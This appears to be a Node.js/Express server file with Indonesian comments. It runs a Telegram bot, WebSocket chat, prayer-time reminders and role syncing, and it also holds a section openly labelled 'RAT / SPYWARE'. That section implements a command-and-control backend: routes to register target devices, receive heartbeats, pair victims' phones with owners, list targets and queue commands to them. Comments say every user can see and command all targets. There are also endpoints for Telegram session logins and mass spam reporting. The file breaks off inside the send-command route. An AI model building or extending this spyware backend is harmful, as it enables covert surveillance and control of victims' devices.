    if (!user) {
        return res.status(401).json({
            valid: false,
            message: "User tidak ditemukan."
        });
    }

    const userRole = (user.role || "").toLowerCase().trim();

    if (!ALLOWED_ROLES.includes(userRole)) {
        return res.status(403).json({
            valid: false,
            message: `Role Anda (${userRole || "kosong"}) tidak diizinkan mengakses.`
        });
    }

    // Sinkronkan role session dengan database
    keyInfo.role = userRole;
    req.keyInfo = {
        ...keyInfo,
        role: userRole
    };

    next();
}

async function readPrayerDB() {

    if (!fs.existsSync(DB_DIR)) {
        fs.mkdirSync(DB_DIR, { recursive: true });
    }

    if (!fs.existsSync(PRAYER_DB)) {

        fs.writeFileSync(
            PRAYER_DB,
            JSON.stringify({
                defaultCity: "jakarta",
                users: {}
            }, null, 2)
        );

    }

    return JSON.parse(
        fs.readFileSync(PRAYER_DB, "utf8")
    );
}

async function savePrayerDB(data) {
    fs.writeFileSync(
        PRAYER_DB,
        JSON.stringify(data, null, 2)
    );
}

async function initPrayerDatabase() {

    if (!fs.existsSync(DB_DIR)) {
        fs.mkdirSync(DB_DIR, { recursive: true });
    }

    if (!fs.existsSync(PRAYER_DB)) {
        fs.writeFileSync(
            PRAYER_DB,
            JSON.stringify({
                defaultCity: "jakarta",
                users: {}
            }, null, 2)
        );

        logSuccess("[✓] prayertime.json dibuat");
    }

    if (!fs.existsSync(PRAYER_MSG)) {
        fs.writeFileSync(
            PRAYER_MSG,
            JSON.stringify({
                Subuh: {
                    title: "🌙 Waktu Subuh",
                    message: "Saatnya menunaikan shalat Subuh."
                },
                Dzuhur: {
                    title: "☀️ Waktu Dzuhur",
                    message: "Saatnya menunaikan shalat Dzuhur."
                },
                Ashar: {
                    title: "🕌 Waktu Ashar",
                    message: "Saatnya menunaikan shalat Ashar."
                },
                Maghrib: {
                    title: "🌇 Waktu Maghrib",
                    message: "Saatnya menunaikan shalat Maghrib."
                },
                Isha: {
                    title: "🌙 Waktu Isya",
                    message: "Saatnya menunaikan shalat Isya."
                }
            }, null, 2)
        );

        logSuccess("[✓] prayermessage.json dibuat");
    }
}

function readMessages() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
    return { messages: [], messageIdCounter: 1 };
  } catch (error) {
    logError('Read messages error:', error);
    return { messages: [], messageIdCounter: 1 };
  }
}

function writeMessages(data) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    logError('Write messages error:', error);
  }
}

const bot = new TelegramBot(TOKEN, { polling: true });
bot.on("polling_error", (err) => {
    logError("POLLING ERROR:", err);
});

// ==========================================================
// [+] RICH MESSAGE BUILDER - Untuk semua teks bot
// ==========================================================
function buildRichMessage(text, options = {}) {
  const {
    title = null,
    subtitle = null,
    footer = null,
    divider = '━━━━━━━━━━━━━━━━━━',
    emoji = null,
    parseMode = 'Markdown',
    ...restOptions
  } = options;

  let parts = [];

  if (title) parts.push(`*${title}*`);
  if (subtitle) parts.push(`_${subtitle}_`);
  if (title || subtitle) parts.push(divider);

  parts.push(text);

  if (footer) {
    parts.push(divider);
    parts.push(footer);
  }

  const finalText = parts.filter(Boolean).join('\n');

  return {
    text: finalText,
    options: {
      parse_mode: parseMode,
      ...restOptions
    }
  };
}

// Helper: kirim rich message
async function sendRich(chatId, text, options = {}) {
  const rich = buildRichMessage(text, options);
  return bot.sendMessage(chatId, rich.text, rich.options);
}

// Helper: edit rich message
async function editRich(chatId, messageId, text, options = {}) {
  const rich = buildRichMessage(text, options);
  return bot.editMessageText(rich.text, {
    chat_id: chatId,
    message_id: messageId,
    ...rich.options
  });
}

// Helper: build caption rich (untuk photo/document)
function buildRichCaption(text, options = {}) {
  const {
    title = null,
    subtitle = null,
    footer = null,
    divider = '━━━━━━━━━━━━━━━━━━',
    parseMode = 'Markdown',
  } = options;

  let parts = [];
  if (title) parts.push(`*${title}*`);
  if (subtitle) parts.push(`_${subtitle}_`);
  if (title || subtitle) parts.push(divider);
  parts.push(text);
  if (footer) {
    parts.push(divider);
    parts.push(footer);
  }
  return parts.filter(Boolean).join('\n');
}

bot.on("webhook_error", (err) => {
    logError("WEBHOOK ERROR:", err);
});

bot.on("error", (err) => {
    logError("BOT ERROR:", err);
});

// ========== KONFIGURASI GROUP DAN CHANNEL ==========
const REQUIRED_CHANNELS = [
    { username: "@xforceinformtion", 
  link: "t.me/xforceinformation", name: "Channel 1" }
];

const ID_GROUP = -1004383403755;
const ID_GROUP_UTAMA = -1004383403755;

const ALLOWED_GROUPS = [
    ID_GROUP,
    ID_GROUP_UTAMA
];

// ═══════════════════════════════════════════════════════════
// [+] AUTO ROLE SYNC — Mapping Group ID → Role
// ═══════════════════════════════════════════════════════════
// ⚠️ GANTI ID GRUP DI BAWAH INI DENGAN ID GRUP ASLI KAMU
// Cara cari ID grup: forward pesan dari grup ke @userinfobot
const ROLE_SYNC_GROUPS = {
  "-1004383403755": "member",
  "-1004383403755": "reseller",
  "-1004383403755": "vip",
  "-1004383403755": "partner",
  "-1004383403755": "owner",
};

// Role hierarchy (buat nentuin role mana yang lebih tinggi)
const ROLE_HIERARCHY = {
  member: 1,
  vip: 2,
  reseller: 3,
  partner: 4,
  admin: 5,
  moderator: 6,
  owner: 7,
  developer: 8,
  god: 9,
};

// File buat nyimpen mapping telegram ID → username account
const TELEGRAM_LINK_FILE = path.join(__dirname, 'telegram_links.json');
if (!fs.existsSync(TELEGRAM_LINK_FILE)) {
  fs.writeFileSync(TELEGRAM_LINK_FILE, JSON.stringify({}, null, 2));
}

function loadTelegramLinks() {
  try {
    return JSON.parse(fs.readFileSync(TELEGRAM_LINK_FILE, 'utf8') || '{}');
  } catch { return {}; }
}

function saveTelegramLinks(data) {
  try {
    fs.writeFileSync(TELEGRAM_LINK_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    logError('[ROLE-SYNC] Gagal save telegram_links:', e.message);
  }
}

function linkTelegramToAccount(telegramId, username) {
  const links = loadTelegramLinks();
  links[String(telegramId)] = {
    username,
    linkedAt: new Date().toISOString(),
  };
  saveTelegramLinks(links);
  logSuccess(`[ROLE-SYNC] Linked TG ${telegramId} → ${username}`);
}

function getUsernameByTelegramId(telegramId) {
  const links = loadTelegramLinks();
  return links[String(telegramId)]?.username || null;
}

// ═══════════════════════════════════════════════════════════
// [+] FUNGSI SYNC ROLE DARI GROUP MEMBERSHIP (FIXED V2)
// ═══════════════════════════════════════════════════════════
async function syncUserRoleFromGroups(telegramUserId) {
  try {
    const username = getUsernameByTelegramId(telegramUserId);
    if (!username) {
      logWarning(`[ROLE-SYNC] TG ${telegramUserId} belum link ke account, skip`);
      return { success: false, reason: 'not_linked' };
    }

    const db = loadDatabase();
    const userIdx = db.findIndex(u => u.username.toLowerCase() === username.toLowerCase());
    if (userIdx === -1) {
      logWarning(`[ROLE-SYNC] Account ${username} tidak ada di DB`);
      return { success: false, reason: 'account_not_found' };
    }

    const user = db[userIdx];

    // Cek semua grup yang di-mapping
    const foundRoles = [];
    for (const [groupId, groupRole] of Object.entries(ROLE_SYNC_GROUPS)) {
      try {
        const member = await bot.getChatMember(groupId, telegramUserId);
        if (['member', 'administrator', 'creator'].includes(member.status)) {
          foundRoles.push(groupRole);
        }
      } catch (e) {
        continue;
      }
    }

    // Cari role tertinggi dari grup-grup yang dia ikuti
    let highestRole = null;
    let highestLevel = 0;
    for (const r of foundRoles) {
      const level = ROLE_HIERARCHY[r] || 0;
      if (level > highestLevel) {
        highestLevel = level;
        highestRole = r;
      }
    }

    // Kalau user gak ada di grup manapun → downgrade ke member
    if (!highestRole) {
      const currentLevel = ROLE_HIERARCHY[(user.role || 'member').toLowerCase()] || 0;

      if (currentLevel > ROLE_HIERARCHY.member) {
        logWarning(`[ROLE-SYNC] ${username} gak di grup sync, tapi role ${user.role} lebih tinggi, skip downgrade`);
        return { success: true, role: user.role, changed: false, reason: 'no_downgrade' };
      }

      if (user.role && user.role !== 'member') {
        db[userIdx].role = 'member';
        db[userIdx].roleSyncedAt = new Date().toISOString();
        saveDatabase(db);

        // 🔥 UPDATE TELEGRAM.JSON JUGA
        removeAllRole(String(telegramUserId));
        addRole(String(telegramUserId), 'member');

        logSuccess(`[ROLE-SYNC] ⬇️ ${username} downgrade ke member`);
        return { success: true, role: 'member', changed: true, reason: 'downgraded' };
      }

      return { success: true, role: user.role || 'member', changed: false, reason: 'no_change' };
    }

    // Cek apakah role berubah
    const currentRole = (user.role || 'member').toLowerCase();
    
    // 🔥 UPDATE TELEGRAM.JSON (Selalu update biar sinkron)
    removeAllRole(String(telegramUserId));
    addRole(String(telegramUserId), highestRole);

    // Kalau role di database sudah sama, gak perlu save ulang
    if (currentRole === highestRole) {
      return { success: true, role: highestRole, changed: false, reason: 'already_synced' };
    }

    // Update role di database.json
    db[userIdx].role = highestRole;
    db[userIdx].roleSyncedAt = new Date().toISOString();
    db[userIdx].roleSyncedFrom = foundRoles;
    saveDatabase(db);

    saveUserLog(username, 'role_sync', `Role Auto Sync → ${highestRole.toUpperCase()}`,
      `Dari grup: ${foundRoles.join(', ')}`);

    logSuccess(`[ROLE-SYNC] ✅ ${username} → ${highestRole.toUpperCase()} (TG + DB)`);

    // Notif ke user
    try {
      await bot.sendMessage(telegramUserId,
        `🔄 *ROLE AUTO SYNC*\n\n` +
        `👤 Account: \`${username}\`\n` +
        `🎭 Role baru: *${highestRole.toUpperCase()}*\n` +
        `📊 Dari grup: ${foundRoles.map(r => r.toUpperCase()).join(', ')}\n\n` +
        `✅ Role kamu udah di-update otomatis di Telegram & Aplikasi.\n` +
        `Login ulang di aplikasi untuk refresh!`,
        { parse_mode: "Markdown" }
      );
    } catch (e) {
      logWarning(`[ROLE-SYNC] Gagal DM user ${telegramUserId}: ${e.message}`);
    }

    return { success: true, role: highestRole, changed: true, fromGroups: foundRoles };

  } catch (err) {
    logError(`[ROLE-SYNC] Error sync ${telegramUserId}:`, err.message);
    return { success: false, error: err.message };
  }
}

// ========== FUNGSI CEK APAKAH USER SUDAH JOIN CHANNEL ==========
async function isUserJoinedChannel(userId, channelId) {
    try {
        const member = await bot.getChatMember(channelId, userId);

        return ["member", "administrator", "creator"].includes(member.status);
    } catch (e) {
        u(e.response?.body || e.message);
        return false;
    }
}

// ========== FUNGSI CEK SEMUA CHANNEL ==========
async function checkAllChannels(userId) {
    const notJoinedChannels = [];

    for (const channel of REQUIRED_CHANNELS) {
        const joined = await isUserJoinedChannel(userId, channel.channelId);

        if (!joined) {
            notJoinedChannels.push(channel);
        }
    }

    return {
        passed: notJoinedChannels.length === 0,
        notJoinedChannels
    };
}

// ========== FUNGSI GET ROLE USER DARI GROUP ==========
async function getUserRoleFromGroup(userId) {
  try {
    for (const groupId of ALLOWED_GROUPS) {
      try {
        const chatMember = await bot.getChatMember(groupId, userId);
        
        if (chatMember.status === 'left' || chatMember.status === 'kicked') {
          continue;
        }
        
        const isAdmin = ['creator', 'administrator'].includes(chatMember.status);
        let role = 'member';
        
        if (isAdmin) {
          if (chatMember.custom_title) {
            role = chatMember.custom_title.toLowerCase();
          } else if (chatMember.status === 'creator') {
            role = 'founder';
          } else {
            role = 'admin';
          }
        }
        
        return { role, isAdmin, isMember: true, groupId };
      } catch (error) {
        continue;
      }
    }
    
    return { role: 'nonmember', isAdmin: false, isMember: false, groupId: null };
  } catch (error) {
    logError('Error getting user role:', error);
    return { role: 'member', isAdmin: false, isMember: false, groupId: null };
  }
}

// ========== FUNGSI CEK APAKAH USER BISA MEMBUAT AKUN ==========
function canCreateAccount(userId, role) {
  const db = loadDatabase();
  
  const userAccounts = db.filter(acc => acc.createdBy === userId);
  const accountCount = userAccounts.length;
  
  if (UNLIMITED_ROLES.includes(role)) {
    return { allowed: true, remaining: 'Unlimited' };
  }
  
  if (role === 'member' || role === 'vip') {
    if (accountCount >= 1) {
      return { allowed: false, remaining: 0, maxAccounts: 1 };
    }
    return { allowed: true, remaining: 1 - accountCount, maxAccounts: 1 };
  }
  
  if (accountCount >= 1) {
    return { allowed: false, remaining: 0, maxAccounts: 1 };
  }
  return { allowed: true, remaining: 1 - accountCount, maxAccounts: 1 };
}

// ========== FUNGSI CEK APAKAH USER FOLLOW CHANNEL ==========
async function checkFollowRequirement(userId, chatId, actionName = "menggunakan bot") {
    const followStatus = await checkAllChannels(userId);

    if (!followStatus.passed) {
        let text =
`❌ AKSES DITOLAK!

Untuk ${actionName}, kamu wajib join channel berikut:

`;

        for (const ch of followStatus.notJoinedChannels) {
            text += `📢 ${ch.name}\n${ch.link}\n\n`;
        }

        text += "Setelah join, kirim /start lagi.";

        await bot.sendMessage(chatId, text);
        return false;
    }

    return true;
}
async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    logError(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      logWarning("⚠️ Folder 'X-FORCE' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      logSuccess(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    logSuccess("[AUTO REFRESH] Auto restart dijalankan...");

    // ✅ Pakai performRestart, bukan process.exit langsung
    await performRestart("Auto Refresh Terjadwal (15 menit)");

  } catch (err) {
    logError("[AUTO REFRESH] Error", err);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    logSuccess("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  logSuccess("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  logSuccess("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    logSuccess(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    logError(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}


// ═══════════════════════════════════════════════════════════
// [+] FCM HELPER — Notif private chat
// ═══════════════════════════════════════════════════════════
async function sendChatFCM(fromUsername, title, body, toUsername) {
  try {
    const db = loadDatabase();
    const toUser = db.find(u => u.username === toUsername);
    if (!toUser || !toUser.fcmToken) return;

    await admin.messaging().sendEachForMulticast({
      notification: { title, body },
      data: {
        type: "private_chat",
        from: fromUsername,
        timestamp: new Date().toISOString(),
      },
      tokens: [toUser.fcmToken],
    });
    logSuccess(`[FCM] Notif chat terkirim ke ${toUsername}`);
  } catch (e) {
    logWarning(`[FCM] Gagal kirim ke ${toUsername}: ${e.message}`);
  }
}


wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      // ═══════════════════════════════════════════════════════════
      // sessionCheck — validasi session key
      // ═══════════════════════════════════════════════════════════
      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      // ═══════════════════════════════════════════════════════════
      // validate — validasi berkala
      // ═══════════════════════════════════════════════════════════
      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }
        }, 10000);
      }

      // ═══════════════════════════════════════════════════════════
      // auth — login WS (dipakai private + group chat)
      // ═══════════════════════════════════════════════════════════
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        logSuccess(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      // ═══════════════════════════════════════════════════════════
      // [WS] joinRoom — Flutter group chat (publik_chat.dart)
      // ═══════════════════════════════════════════════════════════
      if (data.type === 'joinRoom') {
  const room = String(data.room || '').trim();
  if (!username || !room) return;

  if (!wsRoomMembers[room]) wsRoomMembers[room] = [];
  if (!wsRoomMembers[room].includes(username)) {
    wsRoomMembers[room].push(username);
  }

  const pub = loadPublikChat();
  const rawMessages = pub.groups[room] || [];
  const messages = enrichChatMessages(rawMessages);

  ws.send(JSON.stringify({ type: 'roomMessages', room, messages }));
  logSuccess(`[WS-GROUP] ${username} join room: ${room} (${messages.length} pesan)`);
}

      // ═══════════════════════════════════════════════════════════
      // chat — private chat (1-on-1) + group chat (Flutter)
      // ═══════════════════════════════════════════════════════════
      if (data.type === 'chat') {
        // ─── GROUP CHAT (kirim pakai field 'room') ───
        if (data.room) {
  const room = String(data.room).trim();
  const message = String(data.message || '').replace(/[\r\n]/g, ' ').slice(0, 2000);
  const mediaType = data.mediaType || 'text';
  const replyTo = data.replyTo || null;

  if (!username || !room || !message) return;

  const db = loadDatabase();
  const fromUser = db.find(u => u.username === username);

  const chat = enrichChatMessage({
    from: username,
    username,
    room,
    message,
    mediaType,
    replyTo,
    time: new Date().toISOString(),
    role: fromUser?.role || 'member',
    displayName: fromUser?.displayName || username,
    profileImageUrl: fromUser?.profileImageUrl || null,
    avatarUrl: 'assets/images/logo.jpg',
  });

  const pub = loadPublikChat();
  if (!pub.groups[room]) pub.groups[room] = [];
  pub.groups[room].push(chat);
  if (pub.groups[room].length > 500) pub.groups[room] = pub.groups[room].slice(-500);
  savePublikChat(pub);

  const members = wsRoomMembers[room] || [];
  members.forEach(m => {
    const sock = wsClients[m];
    if (sock && sock.readyState === 1) {
      try { sock.send(JSON.stringify({ type: 'chat', message: chat })); } catch {}
    }
  });

  logSuccess(`[WS-GROUP] ${username} → ${room}: ${message.substring(0, 30)}`);
  return;
}

        // ─── PRIVATE CHAT (1-on-1) ───
const to = data.to;
const message = sanitize(data.message);
const mediaType = data.mediaType || 'text';
const replyTo = data.replyTo || null;
if (!username || !to || !message || message.length > 1000) return;

const db = loadDatabase();
const fromUser = db.find(u => u.username === username);

const chat = enrichChatMessage({
  from: username,
  to,
  message,
  mediaType,
  replyTo,
  time: new Date().toISOString(),
  role: fromUser?.role || 'member',
  displayName: fromUser?.displayName || username,
  profileImageUrl: fromUser?.profileImageUrl || null,
  avatarUrl: 'assets/images/logo.jpg',
});

chatList.push(chat);
saveChat();

ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

if (wsClients[to]) {
  wsClients[to].send(JSON.stringify({
    type: 'chat',
    message: { ...chat, fromMe: false }
  }));
}

        let notifBody = `${username} : `;
        if (mediaType === 'image') notifBody += "📷 Photo";
        else if (mediaType === 'video') notifBody += "🎬 Video";
        else if (mediaType === 'audio') notifBody += "🎤 Voice";
        else if (mediaType === 'file') notifBody += "📄 File";
        else notifBody += message;

        sendChatFCM(username, `[PRIVATE CHAT]`, notifBody, to);
      }

      // ═══════════════════════════════════════════════════════════
      // getMessages — ambil history private chat
      // ═══════════════════════════════════════════════════════════
      if (data.type === 'getMessages') {
  const withUser = data.with;
  const messages = chatList
    .filter(m =>
      (m.from === username && m.to === withUser) ||
      (m.from === withUser && m.to === username)
    )
    .map(m => enrichChatMessage({
      ...m,
      fromMe: m.from === username,
    }));

  ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
}

      // ═══════════════════════════════════════════════════════════
      // GROUP WS HANDLERS — grup WhatsApp-style (lama, tetap dipakai)
      // ═══════════════════════════════════════════════════════════

      if (data.type === 'joinGroup') {
        const { groupId } = data;
        if (!username || !groupId) return;

        const rooms = loadChatRooms();
        const room = rooms.find(r => r.id === groupId && r.type === "group");
        if (!room || !room.members.includes(username)) {
          ws.send(JSON.stringify({ type: 'error', message: 'Bukan member grup' }));
          return;
        }

        const allMessages = loadChatMessages();
        const groupMessages = allMessages
          .filter(m => m.roomId === groupId && !m.isDeleted)
          .map(m => ({
            from: m.senderUsername,
            message: m.text || m.mediaUrl || '',
            mediaType: m.type,
            time: m.createdAt,
          }));

        ws.send(JSON.stringify({ type: 'groupMessages', groupId, messages: groupMessages }));
        logSuccess(`[WS-GROUP] ${username} join group: ${groupId}`);
      }

      if (data.type === 'groupChat') {
        const { groupId, message, mediaType } = data;
        if (!username || !groupId || !message) return;

        const rooms = loadChatRooms();
        const room = rooms.find(r => r.id === groupId && r.type === "group");
        if (!room || !room.members.includes(username)) {
          ws.send(JSON.stringify({ type: 'error', message: 'Bukan member grup' }));
          return;
        }

        const msg = {
          id: `msg_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
          roomId: groupId,
          senderUsername: username,
          senderRole: "member",
          type: mediaType || 'text',
          text: message,
          createdAt: new Date().toISOString(),
          isDeleted: false,
        };

        const messages = loadChatMessages();
        messages.push(msg);
        saveChatMessages(messages);

        broadcastToGroupMembers(groupId, {
          type: 'groupChat',
          groupId,
          message: {
            from: username,
            message,
            mediaType: mediaType || 'text',
            time: msg.createdAt,
          },
        });

        logSuccess(`[WS-GROUP] ${username} → ${groupId}: ${message.substring(0, 30)}`);
      }

      if (data.type === 'refreshGroup') {
        const { groupId } = data;
        if (!groupId) return;

        const rooms = loadChatRooms();
        const room = rooms.find(r => r.id === groupId && r.type === "group");
        if (!room) return;

        ws.send(JSON.stringify({ type: 'groupUpdated', group: getGroupDetail(room) }));
      }

      if (data.type === 'leaveGroup') {
        const { groupId } = data;
        if (!username || !groupId) return;
        logSuccess(`[WS-GROUP] ${username} leave socket from ${groupId}`);
      }

      // ⚠️ JANGAN ADA `if (data.type === 'chat')` LAGI DI SINI
      // (blok duplikat LAMA sudah dihapus)

    } catch (e) {
      logError("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = file.fieldname === 'video' ? 'uploads/video' : 'uploads/images';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
    cb(null, uniqueName);
  }
});
const upload = multer({ storage });
app.use('/uploads', express.static('uploads'));
app.use('/uploads/bukti', express.static(BUKTI_DIR));

// ==========================================================
// [+] RAT / SPYWARE DATABASE & FUNCTIONS (Port 2836)
// ==========================================================

app.get('/telegram/login', ToolsController.initiateUnifiedTelegramLogin);
app.get('/telegram/auth', ToolsController.submitTelegramAuth);
app.get('/telegram/status', ToolsController.checkLoginStatus);
app.post('/telegram/verify-password', ToolsController.verifySessionPassword);
app.get('/telegram/sessions', ToolsController.getTelegramSessions);
app.get('/telegram/delete-session', ToolsController.removeTeleSes);
app.get('/telegram/refresh-sessions', ToolsController.refreshTelegramSessions);
app.post('/telegram/spam-report', ToolsController.startSpamReport);
app.get('/telegram/report-status', ToolsController.getSpamReportStatus);
// RAT Database directory
const RAT_TARGETS = './rat_targets.json';
const RAT_COMMANDS = './rat_commands.json';
const RAT_RESPONSES = './rat_responses.json';
const RAT_NOTIFS = './rat_notifs.json';
const RAT_LIVE = {}; // in-memory live frames

// Lock Chat for RAT
const lockChats = {}; // in-memory { deviceId: [{from, text, time}] }

// RAT Helper functions
function readRat(file) {
  try { 
    return JSON.parse(fs.existsSync(file) ? fs.readFileSync(file, 'utf8') || '[]' : '[]'); 
  } catch { 
    return []; 
  }
}

function saveRat(file, data) { 
  try { 
    fs.writeFileSync(file, JSON.stringify(data, null, 2)); 
  } catch(_) {} 
}

// Initialize RAT files
function initRatFiles() {
  const files = [RAT_TARGETS, RAT_COMMANDS, RAT_RESPONSES, RAT_NOTIFS];
  files.forEach(f => {
    if (!fs.existsSync(f)) fs.writeFileSync(f, '[]');
  });
}
function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}


// ==========================================================
// [+] RAT API ROUTES (TAMBAHKAN KE APP YANG SUDAH ADA)
// ==========================================================

// Register Target

// ============================================================
// RAT ENDPOINTS - Tambahkan di dalam app sebelum app.listen
// ============================================================

/**
 * Register a new target device
 * POST /api/register-target
 */
app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

/**
 * Heartbeat from target device
 * POST /api/heartbeat/:id
 */
app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

/**
 * Pair a target device with owner
 * POST /api/pair-target
 */
app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  
  let db = loadDatabase();
  
  // Auto-fix: generate pairId untuk semua user yang belum punya
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      logSuccess('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);
  
  // Cari owner berdasarkan pairId (case-insensitive)
  const ownerIdx = db.findIndex(u => 
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );
  
  logSuccess('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  
  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard' });
  
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { 
    id: deviceId, 
    model: model || 'Unknown', 
    battery: battery || '?', 
    owner: owner.username, 
    status: 'Online', 
    lastSeen: new Date() 
  };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else t.push(dev);
  saveRat(RAT_TARGETS, t);
  
  logSuccess('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

/**
 * List all targets
 * ★ SEMUA USER BISA LIHAT SEMUA TARGET
 * GET /api/list-targets?owner=username&key=sessionKey
 */
app.get('/api/list-targets', (req, res) => {
  const { owner, key } = req.query;
  
  // Validasi key kalau dikirim
  if (key) {
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid key' });
  }
  
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

/**
 * Send command to target device
 * ★ SEMUA USER BISA KIRIM COMMAND
 * POST /api/send-command
 */
app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  if (!id || !command) {
    return res.status(400).json({ status: 'error', message: 'id dan command wajib' });
  }

  // Validasi device exists
  const targets = readRat(RAT_TARGETS);
  const device = targets.find(t => t.id === id);
  if (!device) {
    return res.status(404).json({ status: 'error', message: 'Device not found' });
  }

  let cmds = readRat(RAT_COMMANDS);
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat(RAT_COMMANDS, cmds);
